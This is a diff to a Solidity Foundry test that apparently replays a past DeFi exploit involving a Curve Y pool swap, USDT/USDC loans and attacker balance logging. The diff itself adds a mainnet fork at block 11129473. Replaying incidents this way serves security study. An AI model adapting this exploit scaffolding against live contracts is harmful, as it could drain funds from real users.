@@ -4,7 +4,6 @@ pragma solidity 0.8.10;
 import "ds-test/test.sol";
 import "./interface.sol";
 
-
 contract ContractTest is DSTest {
   CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
   // CONTRACTS
@@ -37,6 +36,13 @@ contract ContractTest is DSTest {
   uint usdtRepayment = (usdtLoan * 100301) / 100000;
   uint usdcBal;
   uint usdtBal;
+  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+  uint256 mainnetFork;
+
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 11129473); //fork mainnet at block 11129473
+        cheats.selectFork(mainnetFork);
+    }
 
     function testExploit() public {
     usdt.approve(address(curveYSwap), type(uint256).max);
@@ -81,9 +87,7 @@ contract ContractTest is DSTest {
     emit log_named_uint("After swap, USDC balance of attacker:", usdc.balanceOf(address(this))/1e6);
     emit log_named_uint("After swap ,USDT balance of attacker:", usdt.balanceOf(address(this))/1e6);
 
-  }
-
- 
+  } 
         receive() external payable {}
 
 }
